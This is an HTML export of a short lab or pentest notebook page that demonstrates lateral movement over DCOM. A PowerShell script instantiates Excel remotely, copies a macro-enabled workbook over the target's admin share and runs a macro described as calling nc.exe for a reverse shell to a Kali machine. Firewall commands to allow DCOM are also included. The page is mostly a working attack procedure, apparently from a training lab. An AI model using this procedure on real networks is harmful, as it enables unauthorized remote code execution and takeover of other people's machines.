<!doctype html><html>
    <head>
      <meta http-equiv="content-type" content="text/html; charset=utf-8">
      <title>Demonstration</title>
      <meta name="generator" content="CherryTree">
      <link rel="stylesheet" href="res/styles3.css" type="text/css" />
    </head>
    <body><div class='page'><h1 class='title'>Demonstration</h1><br/>Running as Tire from UserBox, we will make a macro calling nc.exe in an excel document, use DCOM to move the file to bossman and then execute the macro getting a reverse shell on the kali box.<br />Create a macro that when executed will give you a reverse shell.<br /><a href=""><img src="images/1834-1.png" alt="images/1834-1.png" /></a><br />Run this these commands/this script from userbox, pointing at Bossman.<br /><div class="codebox"><div class="codebox"><span style="color:#0088ff;font-weight:400">$com</span>&nbsp;<span style="color:#ff9d00;font-weight:700">=</span>&nbsp;[activator]<span style="color:#ff9d00;font-weight:700">::</span>CreateInstance([<span style="color:#ff9d00;font-weight:700">type</span>]<span style="color:#ff9d00;font-weight:700">::</span>GetTypeFromProgId(<span style="color:#3ad900;font-weight:400">&quot;Excel.Application&quot;</span>,<span style="color:#3ad900;font-weight:400">&quot;192.168.40.129&quot;</span>))<br /><br /><span style="color:#0088ff;font-weight:400">$LocalPath</span>&nbsp;<span style="color:#ff9d00;font-weight:700">=</span>&nbsp;<span style="color:#3ad900;font-weight:400">&quot;C:\Users\tire\Desktop\Macro.xlsm&quot;</span>&nbsp;<br /><br /><span style="color:#0088ff;font-weight:400">$RemotePath</span>&nbsp;<span style="color:#ff9d00;font-weight:700">=</span>&nbsp;<span style="color:#3ad900;font-weight:400">&quot;\\192.168.40.129\c$\Macro.xlsm&quot;</span>&nbsp;<br /><br />[System.IO.File]<span style="color:#ff9d00;font-weight:700">::Copy</span>(<span style="color:#0088ff;font-weight:400">$LocalPath</span>,&nbsp;<span style="color:#0088ff;font-weight:400">$RemotePath</span>,&nbsp;<span style="color:#0088ff;font-weight:400">$True</span>)&nbsp;<br /><br /><span style="color:#0088ff;font-weight:400">$Path</span>&nbsp;<span style="color:#ff9d00;font-weight:700">=</span>&nbsp;<span style="color:#3ad900;font-weight:400">&quot;\\192.168.40.129\c$\Windows\sysWOW64\config\systemprofile\Desktop&quot;</span>&nbsp;<br /><br /><span style="color:#0088ff;font-weight:400">$temp</span>&nbsp;<span style="color:#ff9d00;font-weight:700">=</span>&nbsp;[system.io.directory]<span style="color:#ff9d00;font-weight:700">::</span>createDirectory(<span style="color:#0088ff;font-weight:400">$Path</span>)&nbsp;<br /><br /><span style="color:#0088ff;font-weight:400">$Workbook</span>&nbsp;<span style="color:#ff9d00;font-weight:700">=</span>&nbsp;<span style="color:#0088ff;font-weight:400">$com</span>.Workbooks.Open(<span style="color:#3ad900;font-weight:400">&quot;C:\Macro.xlsm&quot;</span>)<br /><br /><span style="color:#0088ff;font-weight:400">$com</span>.Run<span style="color:#000000;font-weight:400">(</span><span style="color:#3ad900;font-weight:400">&quot;Yeeter&quot;</span><span style="color:#000000;font-weight:400">)</span></div></div><br /><br /><a href=""><img src="images/1834-2.png" alt="images/1834-2.png" /></a><br /><br /><a href=""><img src="images/1834-3.png" alt="images/1834-3.png" /></a><br /><br />Note- You may need to add a firewall rule depending on the networks GPO to create the COM object.<br />New-NetFirewallRule -DisplayName &quot;Allow DCOM&quot; -Direction Inbound -Action Allow -Enabled True -RemoteAddress 192.168.40.133<br />Remove-NetFirewallRule -DisplayName “Allow DCOM”</div></body></html>